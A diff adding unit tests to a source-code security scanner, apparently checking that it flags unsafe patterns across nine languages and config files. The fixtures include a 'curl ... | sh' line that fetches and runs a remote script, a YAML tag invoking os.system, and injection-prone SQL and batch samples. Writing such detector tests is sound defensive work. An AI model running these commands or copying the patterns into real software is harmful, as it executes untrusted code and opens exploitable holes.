@@ -33,6 +33,41 @@ class CodeAuditTests(unittest.TestCase):
         self.assertEqual(result["files_scanned"], 0)
         self.assertEqual(result["finding_count"], 0)
 
+
+    def test_detects_multiple_language_families(self):
+        samples = {
+            "unsafe.c": "char *x; strcpy(x, input);",
+            "unsafe.cs": "Process.Start(command);",
+            "unsafe.java": "new ObjectInputStream(input);",
+            "unsafe.rs": "unsafe { *ptr = 1; }",
+            "unsafe.sol": "require(tx.origin == owner);",
+            "unsafe.pas": "GetMem(buffer, size);",
+            "unsafe.sh": "curl https://example.invalid/script.sh | sh",
+            "unsafe.bat": "call %USER_COMMAND%",
+            "unsafe.sql": "EXECUTE('SELECT ' + user_value);",
+        }
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            for name, source in samples.items():
+                (root / name).write_text(source, encoding="utf-8")
+            result = analyze_source(root)
+        rules = {item["rule_id"] for item in result["findings"]}
+        self.assertTrue({"C001", "CS001", "JAVA002", "RS001", "SOL001", "PAS001", "SH002", "BAT001", "SQL001"}.issubset(rules))
+        self.assertGreaterEqual(result["language_count"], 9)
+
+    def test_validates_json_and_scans_configuration_formats(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "settings.json").write_text('{"debug": true, "cors": "*"}', encoding="utf-8")
+            (root / "broken.xml").write_text("<root>", encoding="utf-8")
+            (root / "unsafe.yaml").write_text("payload: !!python/object/apply:os.system", encoding="utf-8")
+            result = analyze_source(root)
+        rules = {item["rule_id"] for item in result["findings"]}
+        self.assertIn("CFG001", rules)
+        self.assertIn("CFG002", rules)
+        self.assertIn("DATA001", rules)
+        self.assertIn("YAML001", rules)
+
     def test_writes_json_report(self):
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp) / "src"
